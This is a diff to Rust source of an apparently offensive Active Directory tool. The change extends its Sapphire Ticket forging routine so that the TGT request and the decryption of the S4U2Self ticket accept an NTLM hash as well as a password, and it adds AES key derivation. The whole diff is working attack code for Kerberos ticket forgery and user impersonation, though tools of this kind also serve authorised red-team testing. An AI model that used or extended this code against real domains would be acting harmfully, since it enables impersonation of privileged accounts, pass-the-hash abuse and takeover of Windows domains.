@@ -47,29 +47,25 @@ pub async fn forge_sapphire_ticket(config: &ForgeConfig) -> Result<ForgeResult> 
 
     validate::validate_sid_format(domain_sid)?;
 
-    let password = config.password.as_deref().ok_or_else(|| {
-        OverthroneError::TicketForge(
-            "Password is required for Sapphire Ticket (to request TGT and decrypt S4U2Self)".into(),
-        )
-    })?;
-
-    let impersonate = config.effective_impersonate();
-
-    // Step 1: Request a legitimate TGT
+    // Step 1: Request a legitimate TGT (via PKINIT, password, or NTLM hash)
     info!("[sapphire] Step 1: Requesting TGT as {}", config.username);
-    let user_tgt = kerberos::request_tgt(
-        &config.dc_ip,
-        &config.domain,
-        &config.username,
-        password,
-        false,
-    )
-    .await?;
+    let user_tgt = config.request_user_tgt().await?;
 
     info!(
         "[sapphire] TGT obtained (etype: {})",
         user_tgt.session_key_etype
     );
+
+    // For the decrypt step we still need the user's long-term key (password or nt_hash)
+    let password = config.password.as_deref();
+    let nt_hash = config.nt_hash.as_deref();
+    if password.is_none() && nt_hash.is_none() {
+        return Err(OverthroneError::TicketForge(
+            "Password or NTLM hash is required for Sapphire Ticket (to decrypt S4U2Self ticket)".into(),
+        ));
+    }
+
+    let impersonate = config.effective_impersonate();
 
     // Step 2: S4U2Self to get a service ticket for the impersonate user
     info!("[sapphire] Step 2: S4U2Self as {impersonate}");
@@ -85,7 +81,7 @@ pub async fn forge_sapphire_ticket(config: &ForgeConfig) -> Result<ForgeResult> 
     info!("[sapphire] Step 3: Decrypting service ticket with user key");
     let ticket_etype = s4u2_self.ticket.enc_part.etype;
 
-    let user_key = derive_user_key(password, ticket_etype)?;
+    let user_key = derive_user_key(password, nt_hash, &config.domain, impersonate, ticket_etype)?;
 
     let cipher = new_kerberos_cipher(ticket_etype)
         .map_err(|e| OverthroneError::TicketForge(format!("Cipher init: {e}")))?;
@@ -224,12 +220,39 @@ fn ticket_flags_sapphire() -> kerberos_asn1::KerberosFlags {
     kerberos_asn1::KerberosFlags { flags: 0x40E00000 }
 }
 
-fn derive_user_key(password: &str, etype: i32) -> Result<Vec<u8>> {
+fn derive_user_key(
+    password: Option<&str>,
+    nt_hash: Option<&str>,
+    realm: &str,
+    username: &str,
+    etype: i32,
+) -> Result<Vec<u8>> {
     match etype {
-        ETYPE_RC4_HMAC => Ok(overthrone_core::proto::ntlm::nt_hash(password)),
-        ETYPE_AES256_CTS | 17 => Err(OverthroneError::TicketForge(
-            "AES key derivation from password not yet supported — use RC4 (etype 23)".into(),
-        )),
+        ETYPE_RC4_HMAC => {
+            if let Some(hash) = nt_hash {
+                Ok(hex::decode(hash.trim()).map_err(|e| {
+                    OverthroneError::TicketForge(format!("Invalid nt_hash hex: {e}"))
+                })?)
+            } else if let Some(pwd) = password {
+                Ok(overthrone_core::proto::ntlm::nt_hash(pwd))
+            } else {
+                Err(OverthroneError::TicketForge(
+                    "Password or NTLM hash required for RC4 key derivation".into(),
+                ))
+            }
+        }
+        ETYPE_AES256_CTS | 17 => {
+            let pwd = password.ok_or_else(|| {
+                OverthroneError::TicketForge(
+                    "Cleartext password required for AES key derivation (NTLM hash is insufficient)"
+                        .into(),
+                )
+            })?;
+            let cipher = new_kerberos_cipher(etype)
+                .map_err(|e| OverthroneError::TicketForge(format!("Cipher init: {e}")))?;
+            let salt = cipher.generate_salt(realm, username);
+            Ok(cipher.generate_key_from_string(pwd, &salt))
+        }
         _ => Err(OverthroneError::TicketForge(format!(
             "Unsupported etype: {etype}"
         ))),
